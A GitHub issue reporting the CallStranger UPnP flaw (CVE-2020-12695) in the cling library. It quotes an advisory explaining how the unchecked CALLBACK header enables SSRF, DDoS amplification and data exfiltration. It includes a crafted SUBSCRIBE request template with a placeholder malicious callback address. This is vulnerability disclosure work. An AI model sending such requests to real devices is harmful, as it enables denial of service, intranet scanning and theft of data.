## Description

![@YYHYlh](https://avatars.githubusercontent.com/u/28374935?u=64b7dbc5e2dc964e4a17d4cd9d4be21f64d1f39f&v=4&size=48)[YYHYlh](https://github.com/YYHYlh)opened [on Jun 10, 2020](https://github.com/4thline/cling/issues/253#issue-636120676)

The Upnp protocol implemented in the latest version of cling has a flaw, and the CALLBACK parameter in the request header of the service's subscribe request is not checked, resulting in the attacker using this flaw to send malicious data to the device developed using cling, which causes the device to specify to the attacker. A large amount of data is sent from the IP address of the IP address to implement a DDOS attack; at the same time, the vulnerability can be used to implement an SSRF attack on the intranet.

Payload is

```
SUBSCRIBE / HTTP/1.1
Host: localhost:9999
Accept-Encoding: identity
User-Agent: Callstranger Vulnerability Checker
CALLBACK: <Malicious address>
TIMEOUT: Second-300
NT: upnp:event
Content-Length: 0

```

Universal Plug and Play (UPnP), a ubiquitous protocol used by “billions of devices,” may be vulnerable to data exfiltration and reflected amplified TCP distributed denial of service (DDoS) attacks.

### Background

On June 8, researcher [Yunus Çadirci](https://twitter.com/yunuscadirci?lang=en) published an advisory for [CallStranger](https://callstranger.com/), a vulnerability in the Universal Plug and Play (UPnP) protocol. UPnP is currently managed by the Open Connectivity Foundation (OCF). As its name implies, UPnP is a protocol designed to allow a variety of networked devices to universally communicate with each other without any special setup or configuration.

Because of its ubiquitous nature, UPnP is used by a wide variety of devices, including personal computers, networking equipment, video game consoles and internet of things (IoT) devices such as smart televisions. As a result, Çadirci says this particular vulnerability potentially affects “billions of devices.”

### Analysis

[CVE-2020-12695](https://www.tenablecloud.cn/cve/CVE-2020-12695) is a server-side request forgery (SSRF)-like vulnerability in devices that utilize UPnP. The vulnerability exists due to the ability to control the Callback header value in the UPnP SUBSCRIBE function.

![CVE-2020-12695: CallStranger Vulnerability in Universal Plug and Play (UPnP) Puts Billions of Devices At Risk](https://www.tenable.com/sites/drupal.dmz.tenablesecurity.com/files/images/blog/CVE-2020-12695%20-%20CallStranger%20Vulnerability.png)![]()

Source: [CallStranger Technical Report](https://github.com/yunuscadirci/CallStranger/blob/master/CallStranger%20-%20Technical%20Report.pdf)

The SUBSCRIBE function is part of the UPnP standard that allows devices to monitor changes in other devices and services. For example, the [PoC published on GitHub](https://github.com/yunuscadirci/CallStranger) shows port 2869 for Microsoft’s Xbox One — which is used to monitor device changes on the network for features like media sharing — as vulnerable.

In order to exploit the flaw, an attacker would need to send a specially crafted HTTP SUBSCRIBE request to a vulnerable device.

An attacker could utilize this vulnerability in the following scenarios:

* Intranet device port scanning to gather additional data from trusted assets within an organization’s LAN, bypassing organizational Data Loss Prevention (DLP) standards.
* [Send large amounts of traffic to arbitrary destinations](https://kb.cert.org/vuls/id/339275). Targets flooded by the affected devices could crash under the increased network load, resulting in a denial of service (DoS). This is a result of UPnP attempting to establish a TCP handshake with multiple SYN packets for all Callback values in the SUBSCRIBE request.
* Exfiltrate sensitive device data by directing callback information to arbitrary targets.

With the exception of the DoS, these scenarios provide a stealthy method for an attacker to steal data from a compromised network. This sensitive information could potentially open up an organization to further attack.

### Proof of concept

The original proof of concept (PoC) created by Çadirci has been added to his [GitHub repository](https://github.com/yunuscadirci/CallStranger).

### Solution

Since CallStranger is a protocol-level vulnerability, OCF has made changes to the UPnP protocol specification. Therefore, manufacturers of affected devices are in the process of determining its impact. As a result, we anticipate newly affected devices will be reported and patches will be released over time for devices still receiving product support. Tenable product coverage for this vulnerability can be found in the “identifying affected systems” section below.
